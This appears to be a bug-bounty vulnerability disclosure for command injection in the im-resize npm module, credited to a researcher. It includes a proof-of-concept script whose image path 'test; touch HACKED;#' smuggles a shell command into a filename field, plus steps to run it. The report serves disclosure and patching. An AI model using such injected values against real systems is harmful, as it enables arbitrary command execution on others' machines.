The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))
1. Create the following PoC file:
```js
// poc.js
var resize = require('im-resize');
var image = {
	path: 'test; touch HACKED;#',
	width: 5184,
	height: 2623
};

var output = {
	versions: [{
		suffix: '-thumb',
		maxHeight: 150,
		maxWidth: 150,
		aspect: "3:2"
	},{
		suffix: '-square',
		maxWidth: 200,
		aspect: "1:1"
	}]
};
resize(image, output, function(error){console.log()});
```
1. Check there aren't files called `HACKED`
1. Execute the following commands in another terminal:
```bash
npm i im-resize # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created
## References:
 - [GitHub Issue](https://github.com/Turistforeningen/node-im-resize/issues/20)
 - [GitHub Permalink #1](https://github.com/Turistforeningen/node-im-resize/blob/master/index.js#L115)